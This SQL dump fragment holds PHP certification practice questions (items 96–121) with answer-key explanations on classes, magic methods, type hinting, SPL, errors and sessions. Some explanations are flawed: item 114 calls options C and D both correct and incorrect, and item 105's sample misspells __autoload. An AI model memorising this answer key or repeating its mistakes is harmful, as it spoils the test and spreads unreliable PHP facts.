	(96,3,'Assuming every method call below returns .....$b->doSomething();\r\n?> ','','<p><span>Assuming every method call below returns an instance of an object, how can the following be re-written in PHP5?</span></p>\r\n<p><span><pre><?php\r\n    $a = new MyClass();\r\n    $b = $a->getInstance();\r\n    $c = $b->doSomething();\r\n?> </pre></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option C is correct.</span><br /><br /><span>This is testing \"dereferencing returned objects.\" It can be possible only in the PHP5 and its later version, to call a method on a returned object. Dereferencing returned object facilitates us to call a function that return an object, you can treat the returned value of that function as an object from the calling line and access it directly. This also prevents you from creating temporary variables. Code for this function is given below:</span></p>\r\n<p><span><pre><?php\r\n \r\nclass MyClass{\r\n    function getInstance(){\r\n        return $this;\r\n        \r\n    }\r\n    \r\n    function doSomething(){\r\n        echo \"Something\";\r\n    }\r\n}\r\n \r\n/*\r\n$a = new MyClass();\r\n$b = $a->getInstance();\r\n$c = $b->doSomething();\r\n*/\r\n \r\n \r\n$a = new MyClass();\r\n$c = $a->getInstance()->doSomething();\r\n \r\n?></pre></span></p>\r\n<p><span><span>Answer option A is incorrect. It will generate a syntax error.&nbsp;</span><br /><br /><span>Answer option B is incorrect. This cannot be done in PHP 4.</span><br /><br /><span>Answer option D is incorrect. It will generate a syntax error.</span><br /><br /><uc:ref>Reference:&nbsp;<a target=\"_blank\" href=\"http://in3.php.net/manual/en/language.types.object.php\" tabindex=\"-1\">http://in3.php.net/manual/en/language.types.object.php</a></uc:ref></span></p>',0,'2012-11-23 21:34:07','2012-11-23 21:34:07'),
	(97,3,'What is the output of the following code?.....ho get_class($b2);\r\n?> ','','<p><span>What is the output of the following code?</span></p>\r\n<p><span><pre><?php\r\n    class A {};\r\n    class B1 extends A {};\r\n    class_alias(\'A\', \'B2\');\r\n    $b1 = new B1; echo get_class($b1); \r\n    $b2 = new B2; echo get_class($b2);\r\n?> </pre></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.&nbsp;</span><br /><br /><span>In PHP 5.3 objects instantiated with the aliased name are of the exact same kind of objects instantiated with the non-aliased name &lt;?php class A {}; class_alias(\'A\', \'B\'); ?&gt; is equivalent to &lt;?php class A {}; class B extends A {}; ? &gt;.</span><br /><br /><uc:ref>Reference:&nbsp;<a target=\"_blank\" href=\"http://in3.php.net/manual/en/function.class-alias.php\" tabindex=\"-1\">http://in3.php.net/manual/en/function.class-alias.php</a></uc:ref></p>',0,'2012-11-23 21:35:04','2012-11-23 21:35:04'),
	(98,3,'What is the output of the following code?.....) ? \'yes\' : \'no\'; \r\n?> ','','<p><span>What is the output of the following code?</span></p>\r\n<p><span><pre><?php\r\n    interface foo {}\r\n    class_alias(\'foo\', \'bar\');\r\n    echo interface_exists(\'bar\') ? \'yes\' : \'no\'; \r\n?> </pre></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.&nbsp;</span><br /><br /><span>class_alias also works for interfaces. The class_alias() function is used to create an alias for a class. The syntax of the class_alias() function is as follows:</span></p>\r\n<p><span><pre>bool class_alias ([ string $original [, string $alias ]] ) </pre></span></p>\r\n<p><span><span>Reference:&nbsp;</span><a target=\"_blank\" href=\"http://in3.php.net/manual/en/function.class-alias.php\" tabindex=\"-1\">http://in3.php.net/manual/en/function.class-alias.php</a></span></p>',0,'2012-11-23 21:36:27','2012-11-23 21:36:27'),
	(99,3,'Maria creates an application using PHP sc.....uld Maria do to achieve this?','','<p><span>Maria creates an application using PHP script. The application contains certain classes. The class design requires that a particular member variable must be directly accessible to any subclass of this class only. What should Maria do to achieve this?</span></p>','<div class=\"clearfix\"><b>Explanation:</b>&nbsp;Answer option C is correct.<br /><br />According to the scenario, the class design requires that a particular member variable must be directly accessible to any subclass of this class. Hence, she should mark the member variable as protected. Access control modifiers/access specifiers are PHP keywords that affect the behavior of the class or function it precedes. PHP has a number of modifiers, which are listed in the following table:\r\n<table border=\"1\">\r\n<tbody>\r\n<tr><th>Keyword</th><th>Description</th></tr>\r\n<tr>\r\n<td>final</td>\r\n<td>It defines a constant feature. This variable or function cannot be overridden in an inherited class.</td>\r\n</tr>\r\n<tr>\r\n<td>private</td>\r\n<td>It specifies that a feature can be accessed only by code in the same class.</td>\r\n</tr>\r\n<tr>\r\n<td>protected</td>\r\n<td>It specifies that a feature can be accessed only by code in a subclasses of the class where it is defined.</td>\r\n</tr>\r\n<tr>\r\n<td>public</td>\r\n<td>It specifies that a feature can be accessed by any other class.</td>\r\n</tr>\r\n<tr>\r\n<td>abstract</td>\r\n<td>It cannot be used directly. Hence, a user must have to inherit abstract function or method first.<br /><br /></td>\r\n</tr>\r\n</tbody>\r\n</table>\r\n</div>',0,'2012-11-23 21:42:00','2012-11-23 21:42:00'),
	(100,3,'Which of the following keywords is used t..... be overridden by a subclass?','','<p><span>Which of the following keywords is used to prevent a method/class to be overridden by a subclass?</span></p>','<div class=\"clearfix\"><b>Explanation:</b>&nbsp;Answer option A is correct.<br /><br />The final keyword is used to prevent a method/class to be overridden by a subclass. Access control modifiers/access specifiers are PHP keywords that affect the behavior of the class or function it precedes. PHP has a number of modifiers, which are listed in the following table:\r\n<table border=\"1\">\r\n<tbody>\r\n<tr><th>Keyword</th><th>Description</th></tr>\r\n<tr>\r\n<td>final</td>\r\n<td>It defines a constant feature. This variable or function cannot be overridden in an inherited class.</td>\r\n</tr>\r\n<tr>\r\n<td>private</td>\r\n<td>It specifies that a feature can be accessed only by code in the same class.</td>\r\n</tr>\r\n<tr>\r\n<td>protected</td>\r\n<td>It specifies that a feature can be accessed only by code in a subclasses of the class where it is defined.</td>\r\n</tr>\r\n<tr>\r\n<td>public</td>\r\n<td>It specifies that a feature can be accessed by any other class.</td>\r\n</tr>\r\n<tr>\r\n<td>abstract</td>\r\n<td>It cannot be used directly. Hence, a user must have to inherit abstract function or method first.<br /><br /></td>\r\n</tr>\r\n</tbody>\r\n</table>\r\n</div>',0,'2012-11-23 21:45:33','2012-11-23 21:45:33'),
	(101,3,'You run the following PHP script:','','<p><span>You run the following PHP script:</span></p>\r\n<p><span><pre><?php\r\n   class number {\r\n       public $a= 10;\r\n      public $b=20;\r\n      private $c=30;\r\n}\r\n    $numbers = new number();\r\n \r\n     foreach($numbers as $var => $value) {\r\n       echo \"$value \";\r\n   }\r\n?> </pre></span></p>\r\n<p><span><span>What will be the output?</span></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>In the given script, $c variable is not in the output because it is marked Private and we are trying to access it from the global scope. Hence, the $c variable cannot be accessed in the global scope and the output will be as follows:</span></p>\r\n<p><span><pre>10 20</pre></span></p>\r\n<p><span><span>However, you can see private variables too when the object itself looped through its variables. For example, in the given script private as well as public both the variables are assessable:</span></span></p>\r\n<p><span><span><pre><?php\r\n       class number {\r\n              public $a= 10;\r\n              public $b=20;\r\n              private $c=30;\r\n \r\n        public function output() {\r\n               foreach($this as $var => $value) {\r\n                      echo \"$var is $value \";\r\n                  }\r\n           }\r\n    }\r\n \r\n       $numbers = new number();\r\n       $numbers->output();\r\n?> </pre></span></span></p>\r\n<p><span><span><uc:hed>Output:</uc:hed><span>&nbsp;10 20 30</span></span></span></p>',0,'2012-11-23 21:48:42','2012-11-23 21:48:42'),
	(102,3,'You want to save a client\'s session value.....take to accomplish this task?','','<p><span>You want to save a client\'s session values in a database. Which of the following actions will you take to accomplish this task?</span></p>','<div class=\"clearfix\"><b>Explanation:</b>&nbsp;Answer option A is correct.<br /><br />The session_set_save_handler() function is used to set the user-level session storage functions to store and retrieve data associated with a session. This is most useful when the Web developer wants to store the session data in a local database.<br /><br />Answer option C is incorrect. The session_save_path() function returns the path of the current directory that is being used for saving session data.<br /><br />Answer options B and D are incorrect. These are not valid options to accomplish the desired task.<br /><br /><uc:ref>Reference:&nbsp;<a target=\"_blank\" href=\"http://www.php.net/manual/en/function.session-set-save-handler.php\" tabindex=\"-1\">http://www.php.net/manual/en/function.session-set-save-handler.php</a></uc:ref></div>',0,'2012-11-23 21:51:06','2012-11-23 21:51:06'),
	(103,3,'Which of the following is triggered when .....iggered in an object context?','','<p><span>Which of the following is triggered when inaccessible methods are triggered in an object context?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>The __call() method is the magic method in PHP 5 that is triggered when inaccessible methods are triggered in an object context. If a user defines the __call() method in the class, he can catch undefined/inaccessible method and decide what to do with it.</span></p>',0,'2012-11-23 21:51:51','2012-11-23 21:51:51'),
	(104,3,'Which of the following allows a programme.....ect is ever used as a string?','','<p><span>Which of the following allows a programmer to set a string value for the object that will be used if the object is ever used as a string?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>The __toString() method is called to directly echo or print() an object. It allows a programmer to set a string value for the object that will be used if the object is ever used as a string. The example of the __toString() magic method is as follows:</span></p>\r\n<p><span><pre><?php\r\n      class boy {\r\n             public function __toString() {\r\n                 return \"This is a boy\\n\";\r\n             }\r\n      }\r\n   $toby = new boy;\r\n   print $toby;\r\n?> </pre></span></p>',0,'2012-11-23 21:53:29','2012-11-23 21:53:29'),
	(105,3,'Fill in the blank with the appropriate me.....tantiate a nonexistent class.','','<p><span>Fill in the blank with the appropriate method.</span></p>\r\n<p><span>The <span face=\"Lucida Grande\" style=\"font-family: \'Lucida Grande\';\"><span style=\"font-size: 11px;\">______________</span></span>&nbsp;method automatically calls whenever a user tries to instantiate a nonexistent class.</span></p>','<p><b>Correct Answer: B</b><span></span></p>\r\n<div id=\"correctAns\" class=\"correctAns\">The <span style=\"text-decoration: underline;\"><span face=\"Lucida Grande\" style=\"font-family: \'Lucida Grande\';\"><span style=\"font-size: 11px;\">__autoload&nbsp;</span></span></span>method automatically calls whenever a user tries to instantiate a nonexistent class.</div>\r\n<div class=\"correctAns\"></div>\r\n<div class=\"correctAns\"><b>Explanation:</b><span>&nbsp;The __autoload() function automatically calls whenever a user tries to instantiate a nonexistent class. The __autoload() function is passed through a string variable representing the class name that was not found. A user can use this string to include a source file. For example, consider the following PHP script:</span></div>\r\n<div class=\"correctAns\"><span><br /></span></div>\r\n<div class=\"correctAns\"><span><pre><?php\r\n    function ___autoload ($name) {\r\n        $file = \"$name.inc.php\";\r\n        include_once( $file );\r\n    }\r\n    $result = new testing();\r\n?> </pre></span></div>\r\n<div class=\"correctAns\"><span><br /></span></div>\r\n<div class=\"correctAns\"><span><span>In the above script, a user attempts to instantiate an object from a nonexistent testing class. The __autoload() function is automatically called. If the file called name.inc.php exists and contains the class testing(), it will be included and the object will be instantiated.</span></span></div>',0,'2012-11-23 21:56:41','2012-11-23 21:56:41'),
	(106,3,'Consider the following PHP code snippet:','','<p><span>Consider the following PHP code snippet:</span></p>\r\n<p><span><pre>class A {\r\nstatic $word = \"hello\";\r\nstatic function hello() {print static::$word;}\r\n}\r\nclass B extends A {\r\nstatic $word = \"bye\";\r\n}\r\nB::hello();</pre></span></p>\r\n<p><span><span>What will be the output on running the above mentioned code snippet?</span></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>Late static binding is a variant of binding between static and dynamic binding. Late static binding works by storing the class named in the last \"non-forwarding call\". For example, a developer will get the output \'hello\' in the following PHP script:</span></p>\r\n<p><span><pre>class A {\r\n    static $word = \"hello\";\r\n    static function hello() {print self::$word;}\r\n}\r\nclass B extends A {\r\n    static $word = \"bye\";\r\n}\r\nB::hello();</pre></span></p>\r\n<p><span><span>However, in the case of late static binding, if \"self::$word\" in the above example were changed to \"static::$word\" as shown in the following block, then the result of the call to B::hello() would be \"bye\":</span></span></p>\r\n<p><span><span><pre>class A {\r\n    static $word = \"hello\";\r\n    static function hello() {print static::$word;}\r\n}\r\nclass B extends A {\r\n    static $word = \"bye\";\r\n}\r\nB::hello();</pre></span></span></p>',0,'2012-11-23 21:58:20','2012-11-23 21:58:20'),
	(107,3,'Which of the following are the uses of Re.....the uses of Reflection?&nbsp;','','<p><span>Which of the following are the uses of Reflection?&nbsp;</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer options A, B, and C are correct.</span><br /><br /><span>Reflection is an API that is used to reverse-engineer classes, interfaces, functions, methods and extensions. It offers ways to retrieve doc comments for functions, classes and methods. Generally, reflection is used for the following reasons:</span></p>\r\n<ul>\r\n<li>To interact with encoded scripts.</li>\r\n<li>To provide complete overview of incompletely updated manual.</li>\r\n<li>To know what is inside the class.</li>\r\n</ul>\r\n<p><span>Reflection helps us to know how things actually work when parts of PHP don\'t have a completely updated documentation.It was throughly used during beta testing of PHP. For example, if you have given the following PHP script:</span></p>\r\n<p><span><pre> <?php\r\n    class myparent {\r\n        public function foo($bar) {\r\n            // do stuff\r\n        }\r\n    }\r\n \r\n    class mychild extends myparent {\r\n        public $val;\r\n \r\n        private function bar(myparent &$baz) {\r\n            // do stuff\r\n        }\r\n        public function __construct($val) {\r\n            $this->val = $val;\r\n        }\r\n    }\r\n    $child = new mychild(\'hello world\');\r\n    $child->foo(\'test\');\r\n$reflect = new ReflectionClass(\'mychild\');\r\necho $reflect;\r\n?></pre></span></p>\r\n<p><span><span>You should get the output like this:</span></span></p>\r\n<p><span><span><pre>Class [ <user> class mychild extends myparent ] {\r\n  @@ C:\\home\\reflect.php 8-18\r\n  - Constants [0] {\r\n  }\r\n  - Static properties [0] {\r\n  }\r\n  - Static methods [0] {\r\n  }\r\n  - Properties [1] {\r\n    Property [ <default> public $val ]\r\n  }\r\n  - Methods [3] {\r\n    Method [ <user> private method bar ] {\r\n      @@ C:\\home\\reflect.php 11 - 13\r\n      - Parameters [1] {\r\n        Parameter #0 [ <required> myparent &$baz ]\r\n      }\r\n    }\r\n    Method [ <user, ctor> public method __construct ] {\r\n      @@ C:\\home\\reflect.php 14 - 16\r\n \r\n      - Parameters [1] {\r\n        Parameter #0 [ <required> $val ]\r\n      }\r\n    }\r\n    Method [ <user, inherits myparent> public method foo ] {\r\n      @@ C:\\home\\reflect.php 3 - 5\r\n      - Parameters [1] {\r\n        Parameter #0 [ <required>$bar ]\r\n      }\r\n    }\r\n  }\r\n}</pre></span></span></p>',0,'2012-11-23 22:00:05','2012-11-23 22:00:05'),
	(108,3,'Which operator can be used to decide whet..... property from another class?','','<p><span>Which operator can be used to decide whether or not an object of a class is inheriting property from another class?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>The instanceof operator lets a programmer inspect all of the ancestor classes of the object, as well as any interfaces. It can also be used to decide whether or not an object of a class is inheriting property from another class. The following example explains the use of the instanceof operator:</span></p>\r\n<p><span><pre><?php\r\n   class A\r\n   { var $variable;\r\n   function display()\r\n      {\r\n         echo \"I am inside the class.\";\r\n      }\r\n   }\r\n$obj=new A;\r\nvar_dump($obj instanceof A);\r\n?> </pre></span></p>',0,'2012-11-23 22:02:26','2012-11-23 22:02:26'),
	(109,3,'Which of the following is used to pass an.....o pass an object practically?','','<p><span>Which of the following is used to pass an object practically?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option C is correct.</span><br /><br /><span>An object is always passed by reference (in reality, it is passed by handle) rather than by value. An object is a living instance of a class. Hence, an object is created from the definition of the class and is loaded in memory. If you want to create an object of a PHP5 class, you can use the keyword new. Below is the syntax style of how to create objects in PHP5:</span></p>\r\n<p><span><pre>$obj_name = new ClassName();</pre></span></p>\r\n<p><span><pre>class User {\r\n    public $first_name, $last_name;\r\n    public function setData($first_name, $last_name) {\r\n        $this->first_name = $first_name;\r\n        $this->last_name = $last_name;\r\n    }\r\n    public function printData() {\r\n        echo $this->first_name . \" : \" . $this->last_name;\r\n    }\r\n} \r\n$u1 = new User();\r\n$u2 = new User();\r\n/* $u1 and $u2 are two objects of the User class. Both these objects are allocated different blocks in the memory.*/</pre></span></p>',0,'2012-11-23 22:03:46','2012-11-23 22:03:46'),
	(110,3,'You run the following PHP script:','','<p><span>You run the following PHP script:</span></p>\r\n<p><span><pre><?php class Test {\r\n  function __call( $var1, $var2 ) {\r\n          $check = \" \'$var1\' called<br />\\n\";\r\n          $check.= print_r( $var2, true );\r\n       return $check;\r\n     }\r\n}\r\n$item = new Test();\r\nprint $item->array( \"John\", \"Maria\", \"Jason\" );\r\n?></pre></span></p>\r\n<p><span><span>What is the work of the __call() method in the above script?</span></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option B is correct.</span><br /><br /><span>The __call() method is the magic method in PHP 5 that is triggered when inaccessible methods are triggered in an object context. If a user defines the __call() method in the class, he can catch undefined/inaccessible method and decide what to do with it. There are two arguments that are automatically passed to the __call() method, i.e., a string variable holding the name of the method that was called and an array variable holding any arguments that were passed. In the above script, you have created a class called Test and given it a __call() method. The __call() method accepts the method name and an array of method arguments. It assigns a string quoting the contents of both of these to a variable, $check, and returns it to the calling code. Hence, in the above PHP code, it will catch the nonexistent $item-&gt;array() method and print the result:</span></p>\r\n<p><span><pre>\'array\' called\r\nArray ( [0] => John [1] => Maria [2] => Jason ) </pre></span></p>\r\n<p><span><br /></span></p>',0,'2012-11-23 22:11:19','2012-11-23 22:11:19'),
	(111,3,'Which of the following methods is called .....ly echo or print() an object?','','<p><span>Which of the following methods is called to directly echo or print() an object?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>The __toString() method is called to directly echo or print() an object. It allows a programmer to set a string value for the object that will be used if the object is ever used as a string. The example of the __toString() magic method is as follows:</span></p>\r\n<p><span><pre><?php\r\n      class boy {\r\n             public function __toString() {\r\n                 return \"This is a boy\\n\";\r\n             }\r\n      }\r\n   $toby = new boy;\r\n   print $toby;\r\n?> </pre></span></p>\r\n<p><span><span>Answer option B is incorrect. The __set_state() magic method is inserted dynamically by var_export() to allow for reinitialization on the execution of var_export()\'s output.</span><br /><br /><span>Answer option C is incorrect. The __unset() method is called when an undefined property is passed to unset().</span><br /><br /><span>Answer option D is incorrect. The __isset() method is called when an undefined property is passed to isset().</span><br /><br /><uc:ref>Reference:&nbsp;<a target=\"_blank\" href=\"http://php.net/manual/en/language.oop5.magic.php\" tabindex=\"-1\">http://php.net/manual/en/language.oop5.magic.php</a></uc:ref></span></p>',0,'2012-11-23 22:12:29','2012-11-23 22:12:29'),
	(112,3,'Fill in the blank with the appropriate wo.....t, as well as any interfaces.','','<p><span>Fill in the blank with the appropriate word.</span></p>\r\n<p><span>The <span face=\"Lucida Grande\" style=\"font-family: \'Lucida Grande\';\"><span style=\"font-size: 11px;\">________________</span></span>&nbsp;operator lets a programmer inspect all of the ancestor classes of the object, as well as any interfaces.</span></p>','<p><b>Correct Answer: C</b><span></span></p>\r\n<div id=\"correctAns\" class=\"correctAns\">The&nbsp;<span style=\"text-decoration: underline;\">instanceof</span>&nbsp;operator lets a programmer inspect all of the ancestor classes of the object, as well as any interfaces.</div>\r\n<div class=\"correctAns\"></div>\r\n<div class=\"correctAns\"><b>Explanation:</b><span>&nbsp;The instanceof operator lets a programmer inspect all of the ancestor classes of the object, as well as any interfaces. It can also be used to decide whether or not an object of a class is inheriting property from another class. The following example explains the use of the instanceof operator:</span></div>\r\n<div class=\"correctAns\"></div>\r\n<div class=\"correctAns\"><pre><?php\r\n   class A\r\n   { var $variable;\r\n   function display()\r\n      {\r\n         echo \"I am inside the class.\";\r\n      }\r\n   }\r\n$obj=new A;\r\nvar_dump($obj instanceof A);\r\n?> </pre></div>\r\n<div class=\"correctAns\"></div>\r\n<div class=\"correctAns\"><uc:hed>Output:&nbsp;</uc:hed><span>bool(true)</span><br /><br /><uc:ref>Reference:&nbsp;<a target=\"_blank\" href=\"http://www.devshed.com/c/a/PHP/Enforcing-Object-Types-in-PHP-Using-the-PHP5-instanceof-Operator/\" tabindex=\"-1\">http://www.devshed.com/c/a/PHP/Enforcing-Object-Types-in-PHP-Using-the-PHP5-instanceof-Operator/</a></uc:ref></div>',0,'2012-11-23 22:14:51','2012-11-23 22:14:51'),
	(113,3,'Which of the following statements correct..... instanceof and type hinting?','','<p><span>Which of the following statements correctly explains the use of instanceof and type hinting?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer options A, B, and C are correct.</span><br /><br /><span>The instanceof operator lets a programmer inspect all of the ancestor classes of the object, as well as any interfaces. It can also be used to decide whether or not an object of a class is inheriting property from another class. The following example explains the use of the instanceof operator:</span></p>\r\n<p><span><pre><?php\r\n   class A\r\n   { var $variable;\r\n   function display()\r\n      {\r\n         echo \"I am inside the class.\";\r\n      }\r\n   }\r\n$obj=new A;\r\nvar_dump($obj instanceof A);\r\n?> </pre></span></p>\r\n<p><span><uc:hed>Output:&nbsp;</uc:hed><span>bool(true)</span><br /><br /><span>In PHP 5, type hinting is a feature due to which functions can specify what type of parameters must be provided to the functions. If that parameter is not of the correct type, the PHP script will give an error. Type hinting is not supported for strings and integers. Type hinting can also help in code completion in an IDE.</span><br /><br /><span>Answer option D is incorrect. The instanceof operator cannot be used to check if the variables are the member of an abstract class.</span><br /><br /><uc:ref>Reference:&nbsp;<a target=\"_blank\" href=\"http://php.net/manual/en/language.operators.type.php\" tabindex=\"-1\">http://php.net/manual/en/language.operators.type.php</a></uc:ref></span></p>',0,'2012-11-23 22:16:17','2012-11-23 22:16:17'),
	(114,3,'Which of the following variables are&nbsp.....sp;supported by type hinting?','','<p><span>Which of the following variables are&nbsp;</span><b>NOT</b><span>&nbsp;supported by type hinting?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer options C and D are correct.</span><br /><br /><span>In PHP 5, type hinting is a feature due to which functions can specify what type of parameters must be provided to the functions. If that parameter is not of the correct type, the PHP script will give an error. Type hinting is not supported for strings and integers. Type hinting can also help in code completion in an IDE. For example, consider the following PHP script:</span></p>\r\n<p><span><pre>function foo(string $foo) {\r\n}\r\nfoo(\'somestring\'); \r\n</pre></span></p>\r\n<p><span><span>It will result the following error:</span></span></p>\r\n<p><span><span><pre>Catchable fatal error: Argument 1 passed to foo() must be an instance of string, string given, called in . ..</pre></span></span></p>\r\n<p><span><span><span>Answer options C and D are incorrect. Object and array datatypes are supported by type hinting.</span></span></span></p>',0,'2012-11-23 22:17:47','2012-11-23 22:17:47'),
	(115,3,'Which of the following SPL Interfaces/cla.....from the internal data store?','','<p><span>Which of the following SPL Interfaces/classes extends the standard Iterator interface and enables the ability to retrieve a specific item from the internal data store?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option B is correct.</span><br /><br /><span>SeekableIterator extends the standard Iterator interface and adds the seek() method to enable the ability to retrieve a specific item from the internal data store.</span><br /><br /><span>Answer option A is incorrect. The ArrayAccess interface allows objects to expose themselves as pseudo-arrays to PHP.</span><br /><br /><span>Answer option C is incorrect. Recursive Iterator allows looping over multi-dimensional tree-like data structures.</span><br /><br /><span>Answer option D is incorrect. The FilterIterator class is used to alter the items returned by iteration.</span><br /><br /><uc:ref>Reference:&nbsp;<a target=\"_blank\" href=\"http://php.net/manual/en/book.spl.php\" tabindex=\"-1\">http://php.net/manual/en/book.spl.php</a></uc:ref></p>',0,'2012-11-23 22:18:31','2012-11-23 22:18:31'),
	(116,3,'In which of the following situations will.....exception_handler() function?','','<p><span>In which of the following situations will you use the set_exception_handler() function?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>The set_exception_handler() function is used to set a default exception handler if a try/catch block is unable to catch an error. The syntax of the set_exception_handler() function is as follows:</span><br /><br /><uc:stx>set_exception_handler(exception_function)&nbsp;</uc:stx><br /><br /><span>where the exception_function parameter specifies the function to be called when an uncaught exception occurs. It must be defined before calling the set_exception_handler() function.</span><br /><br /><span>Answer option B is incorrect. The set_error_handler() function is used to set a user-defined function to handle errors. This function allows a user to handle errors during runtime. The syntax of the set_error_handler() function is as follows:</span><br /><br /><uc:stx>set_error_handler(error_function, error_types)&nbsp;</uc:stx><br /><br /><span>where error_function specifies the function to be run at errors, and the error_types parameter specifies on which errors report levels the user-defined error will be shown. The default error level is \"E_ALL\".</span><br /><br /><span>Answer option C is incorrect. The restore_error_handler() function restores the previous error handler function.</span><br /><br /><span>Answer option D is incorrect. The trigger_error() function is used to generate a user-level error/warning/notice message.</span><br /><br /><uc:ref>Reference:&nbsp;<a target=\"_blank\" href=\"http://www.php.net/manual/en/ref.errorfunc.php\" tabindex=\"-1\">http://www.php.net/manual/en/ref.errorfunc.php</a></uc:ref></p>',0,'2012-11-23 22:19:17','2012-11-23 22:19:17'),
	(117,3,'Which of the following error constants gi.....ept the E_STRICT error level?','','<p><span>Which of the following error constants gives all errors and warnings, except the E_STRICT error level?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>The E_ALL error constant gives all errors and warnings, except the E_STRICT error level.</span><br /><br /><span>Answer option B is incorrect. The E_RECOVERABLE_ERROR constant notices catchable fatal errors.</span><br /><br /><span>Answer option C is incorrect. The E_ERROR constant notices runtime fatal errors. These errors cannot be recovered and execution of the script is halted.</span><br /><br /><span>Answer option D is incorrect. The E_WARNING constant notices non-fatal run-time errors which do not halt script execution.</span><br /><br /><uc:ref>Reference:&nbsp;<a target=\"_blank\" href=\"http://www.w3schools.com/PHP/php_ref_error.asp\" tabindex=\"-1\">http://www.w3schools.com/PHP/php_ref_error.asp</a></uc:ref></p>',0,'2012-11-23 22:20:03','2012-11-23 22:20:03'),
	(118,3,'Which of the following streams is used to.....o access the compressed data?','','<p><span>Which of the following streams is used to access the compressed data?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>compress.zlib is used to access the compressed data stream using the zlib compression library.</span><br /><br /><span>Answer option B is incorrect. It is used to access remote resources via HTTP.</span><br /><br /><span>Answer option C is incorrect. It is used for standard file access.</span><br /><br /><span>Answer option D is incorrect. It is used for standard PHP input/output.</span><br /><br /><uc:ref>Reference:&nbsp;<a target=\"_blank\" href=\"http://php.net/manual/en/wrappers.compression.php\" tabindex=\"-1\">http://php.net/manual/en/wrappers.compression.php</a></uc:ref></p>',0,'2012-11-23 22:20:46','2012-11-23 22:20:46'),
	(119,3,'Which of the following OOPS design patter..... that implements the pattern?','','<p><span>Which of the following OOPS design patterns is used to encapsulate a data source so that accessing data source components becomes hidden within the class that implements the pattern?</span></p>','<div class=\"clearfix\"><b>Explanation:</b>&nbsp;Answer option A is correct.<br /><br />ActiveRecord is used to encapsulate a data source so that accessing data source components becomes hidden within the class that implements the pattern. The ActiveRecord pattern is an approach to accessing data in a database. A database table or view is wrapped into a class; thus, an object instance is tied to a single row in the table. After creation of an object, a new row is added to the table on saving it. Any object loaded gets its information from the database; when an object is updated, the corresponding row in the table is also updated. The wrapper class implements accessor methods or properties for each column in the table or view. The ActiveRecord pattern is used to encapsulate the data source so that accessing the data source components becomes hidden within the class that implements the pattern.&nbsp;<uc:iref source=\"wiki\"><br /><br />Answer option B is incorrect. The Model-view-controller (MVC) pattern separates the business logic (Model) from the display logic (View) and the decisional controls. In MVC, the user initiates an action by calling the Controller. After that, interfaces with the Model causes the Model to perform some actions and changes its state. Finally, the View is called for refreshing the user interface to reflect the changes in the Model and in the requested actions of the Controller.&nbsp;<uc:iref source=\"wiki\"><br /><br />Answer option C is incorrect. In the Registry pattern, a user can add data (both values and objects), and retrieve them as required from other parts of an application. Since a single Registry object handles all such data, it makes passing data and objects around an application far more simple than passing all such values as individual parameters to a constructor or setup method.<br /><br />Answer option D is incorrect. The factory pattern is an object-oriented design pattern. Like other creational patterns, it deals with the problem of creating objects (products) without specifying the exact class of object that will be created. The factory method design pattern handles this problem by defining a separate method for creating the objects whose subclasses can then override to specify the derived type of product that will be created.<uc:iref source=\"wiki\"></uc:iref></uc:iref></uc:iref></div>\r\n<div><uc:iref source=\"wiki\"><uc:iref source=\"wiki\"><br /></uc:iref></uc:iref></div>',0,'2012-11-23 22:21:51','2012-11-23 22:21:51'),
	(120,4,'The _______&nbsp;&nbsp;function is .....f the current session.','','<p><span>The _______&nbsp;<span>&nbsp;function is used to replace the current session id with the new session id, and to keep information of the current session.</span></span></p>','<p><b>Explanation:</b><span>&nbsp;Correct answer B. The session_regenerate_id() function is used to replace the current session id with the new session id, and to keep information of the current session. This function is used as a countermeasure to a session fixation attack in which the attacker attempts to exploit the vulnerability of a system by fixating another person\'s session identifier (SID). The syntax of the session_regenerate_id() function is as follows:</span></p>\r\n<p><span><pre>bool session_regenerate_id  ([ bool $delete_old_session = false  ]) </pre></span></p>\r\n<p><span><span>Reference:&nbsp;</span><a target=\"_blank\" href=\"http://php.net/manual/en/function.session-regenerate-id.php\" tabindex=\"-1\">http://php.net/manual/en/function.session-regenerate-id.php</a></span></p>',0,'2012-11-23 22:26:47','2012-11-23 22:26:47'),
	(121,4,'Which of the following functions is the b..... the fingerprint of a string?','','<p><span>Which of the following functions is the best choice to retrieve the fingerprint of a string?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option C is correct.</span><br /><br /><span>The md5() function retrieves the fingerprint of a string and returns the hash as a 32-character hexadecimal number.</span><br /><br /><span>Answer option A is incorrect. The crypt() function returns a hashed string using the standard Unix DES-based algorithm or alternative algorithms that may be available on the system.</span><br /><br /><span>Answer option B is incorrect. fingerprint() is not a valid function.</span><br /><br /><span>Answer option D is incorrect. The hash() function can also be a possible answer; however, it is not the best answer since it provides the hash based on \"md5\", \"sha256\", \"haval160,4\", etc., and you need to give the hashing algorithm name in the argument option.</span></p>',0,'2012-11-23 22:27:54','2012-11-23 22:27:54'),
